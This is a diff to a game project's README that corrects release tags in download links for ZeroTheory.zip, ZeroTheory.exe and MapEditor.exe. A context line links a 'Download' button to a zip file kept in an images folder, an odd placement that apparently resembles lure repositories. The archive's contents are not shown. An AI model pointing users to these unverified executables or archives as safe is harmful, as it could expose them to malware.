@@ -13,7 +13,7 @@ A undesigned game.
     <td align="right"><a href="https://github.com/sinhamajoni06-cell/Zero-Theory/raw/refs/heads/main/main/assets/images/temp.zip">Download</a></td>
   </tr>
   <td align="left"><b>Zero-Theory (v0.2.2)</b>: (<a href="https://github.com/sinhamajoni06-cell/Zero-Theory/releases#release-v0.2.2"><code>ZeroTheory.zip</code></a>)</td>
-    <td align="right"><a href="https://github.com/sinhamajoni06-cell/Zero-Theory/releases/download/v.0.2.2/ZeroTheory.zip">Download</a></td>
+    <td align="right"><a href="https://github.com/sinhamajoni06-cell/Zero-Theory/releases/download/v0.2.2/ZeroTheory.zip">Download</a></td>
   </tr>
 </table>
 
@@ -22,11 +22,11 @@ A undesigned game.
 <table>
   <tr>
     <td align="left"><b>Game</b>: (<a href="https://github.com/sinhamajoni06-cell/Zero-Theory/tree/main#build-guide-"><code>ZeroTheory.exe</code></a>)</td>
-    <td align="right"><a href="https://github.com/sinhamajoni06-cell/Zero-Theory/releases/download/v.0.2.2/ZeroTheory.exe">Download</a></td>
+    <td align="right"><a href="https://github.com/sinhamajoni06-cell/Zero-Theory/releases/download/v0.2.2/ZeroTheory.exe">Download</a></td>
   </tr>
   <tr>
     <td align="left"><b>Map Engine</b>: (<a href="https://github.com/sinhamajoni06-cell/Zero-Theory/tree/main#build-guide-"><code>MapEditor.exe</code></a>)</td>
-    <td align="right"><a href="https://github.com/sinhamajoni06-cell/Zero-Theory/releases/download/v.0.2.2/MapEditor.exe">Download</a></td>
+    <td align="right"><a href="https://github.com/sinhamajoni06-cell/Zero-Theory/releases/download/v0.2.2/MapEditor.exe">Download</a></td>
   </tr>
 </table>
 
